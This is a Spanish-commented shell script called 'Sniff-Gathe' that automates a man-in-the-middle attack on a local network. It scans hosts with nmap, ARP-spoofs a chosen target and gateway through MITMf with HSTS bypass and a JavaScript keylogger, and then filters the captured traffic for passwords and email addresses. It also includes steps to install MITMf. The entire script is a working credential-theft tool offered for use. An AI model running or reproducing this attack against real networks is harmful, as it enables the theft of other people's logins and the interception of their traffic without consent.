#!/bin/sh

 

# S N I F F - G A T H E      by  N A I V E N O M 


#Es un script (shell script), para automatizar las herramientas de escaneo como Nmap y Man in the Middle como MITMF.
#El objetivo de la herramienta es el uso en una red LAN. A traves de una IP privada, donde no sabemos nada sobre ese host, poder sacar su correo electronico, usuarios y contraseñas de sitios web. 
#Primero escaneamos la red con nmap, luego seleccionamos la IP donde se quiere esnifar el trafico y el gateway de la red (router). Seleccionamos nustra interfaz, ethernet, wlan etc..Por ultimo ejecutamos el mitmf de la opcion 6 (herramienta escrita en python). Se abrira una terminal nueva, donde podremos dar a la opcion 7, para ir viendo el resultado de la captura del Man in the Middle. Es importante ir actualizando esta ventana, para ver nuevos resultados.

#funcion pausa

pause()
{
     read -p "Press [Enter] key to continue..." fackEnterKey
            } 

#menu

_menu()

{
    
tput setaf 1;  
    echo " "
    echo  "                     /\ "
    echo  "__/\________________/  \________________________ "

tput setaf 2;
    echo " S N I F F - G A T H E       by  N A I V E N O M "                   
tput setaf 3;
    echo "::::::::::::::::::::::::::::::::::::::::::::::::"
    
    echo " " 
    
tput sgr0;
    echo "Selecciona una opcion:"

    echo

    echo "1) Seleccionar Red [IP/MASK]"

    echo "2) Nmap"

    echo "3) Seleccionar Target IP Host && Gateway"

    echo "4) Seleccionar Interface"

    echo "5) Mostrar opciones"

    echo "6) MITMF"

    echo "7) Resultado de la captura"

    echo
   
    echo "8) Instalar Nmap"

    echo "9) Instalar MITMF (Repositorios)"

    echo "10) Instalar MITMF (Github [Recomendado])"

    

    echo "11) Salir"

    echo 

    echo -n "Indica una opcion: "

}

 



_mostrar()

{

    clear

    echo ""

    echo "------------------------------------"

    echo "Has seleccionado la opcion $1"

    echo "------------------------------------"

    echo ""

}

 



opc="0"

 



until [ "$opc" -eq "11" ];

do

    case $opc in

        1)

            _mostrar $opc

             
            _menu

            tput setaf 2;

            echo 
            
            echo "Introduce tu IP/MASK (Mascara notacion decimal /8../16../24..)"
            
            read IP 
     
            echo "IP/MASK seleccionada: "
        
            echo "$IP" 


            pause 

            tput sgr0;
          
            clear
 
            _menu 

            ;;
            
            
    
            

        2)

            _mostrar $opc

            _menu
 
            tput setaf 2;

            echo 
            
            echo "Nmap scanner"
            
            echo "Espere por favor..."

            nmap -sn $IP | cut -d" " -f5,6 | grep -v "^[latencyIncorporationTechnologiesMobility,a]" | tee /tmp/ip_targets | cat 
 
            pause 

            tput sgr0;
         
            clear 

            _menu

            ;;

        3)

            _mostrar $opc
     
            _menu

            tput setaf 2;
 
            echo

            cat /tmp/ip_targets
  
            echo "Selecciona IP host:"

            echo

            read IP_host 

            echo
     
            echo "IP seleccionada: "
        
            echo "$IP_host" 

            echo

            echo "Selecciona IP Gateway:"

            echo

            read IP_gateway 

            echo
     
            echo "IP seleccionada: "
        
            echo "$IP_gateway" 

            pause  

            tput sgr0;

            clear

            _menu

            ;;

        4)

            _mostrar $opc

            _menu

            tput setaf 2;
  
            echo 

            echo "Escriba interfaz (eth0 or eth1 or wlan0 or eth/wlanx..)"

            read interface 

            echo
     
            echo "Interface seleccionada: "

            echo
        
            echo "$interface"

            pause

            tput sgr0;

            clear

            _menu

            ;;

         5)

            _mostrar $opc

            _menu

            tput setaf 2;

            echo 

            echo "$IP_host"

            echo "$IP_gateway"

            echo "$interface"

            pause

            tput sgr0;

            clear

            _menu
            

            ;;

         6)

            _mostrar $opc

            _menu

            


           

            gnome-terminal -e ./sniff-gathe.sh 

            tput setaf 2;
            echo
            echo 

         
            echo "MITMF attack [Es necesario que este instalado el programa en /root, sino desde el source se puede modificar la ruta!!"

            echo


            echo "Capturando Email y posibles usuarios y contraseñas. "
 
            cd /root/MITMf #entramos en la carpeta donde se encuentra el programa 
            
            python mitmf.py --spoof --arp -i $interface --targets $IP_host --gateway $IP_gateway --hsts --jskeylogger > /tmp/captura

            
            pause

            tput sgr0;

            clear

            _menu

            ;;

          7)

            _mostrar $opc

            _menu

   
                   
       
           

            

            tput setaf 2;
            echo
            echo 

         
            echo "Resultado de la captura [IR ACTUALIZANDO]"

            echo


            echo 
 
            cat /tmp/captura | grep -i 'pass' | tr -s "&" ":"  | tr -s "%40" "@"
            
             

            
            pause

            tput sgr0;

            clear

            _menu

            ;;

          8)


            _mostrar $opc

            _menu

            echo 
     
            echo "Instalar NMAP (Requerido tener actualizado y añadido los repositorios)"

            pause

            apt-get install nmap 

            pause

            clear

            _menu

            ;;

          9)

            _mostrar $opc

            _menu

            echo 

            echo "Instalar MITMF (Requerido tener actualizado y añadido los repositorios)"

            pause

            apt-get install mitmf 

            pause

            clear

            _menu

            ;;

          10)

            _mostrar $opc

            _menu

            echo 

            echo "Instalar MITMF (Desde Github) [Para que funcione la opcion 6, se tiene que instalar en la carpeta /root o desde el source se puede modificar la ruta!!"

            pause
           
            apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file

            echo "CLONAR REPOSITORIOS DE MITMf"

            pause
            
            git clone https://github.com/byt3bl33d3r/MITMf

            echo "cd AL DIRECTORIO CREADO E INICIAR Y CLONAR SUBMODULOS"

            pause

            cd MITMf && git submodule init && git submodule update --recursive

            echo "INSTALAR DEPENDENCIAS"

            pause

            pip install -r requirements.txt

            

            pause

            clear

            _menu

            ;;

        *)

            # Esta opcion se ejecuta si no es ninguna de las anteriores

            clear

            _menu

            ;;

    esac

    read opc

done
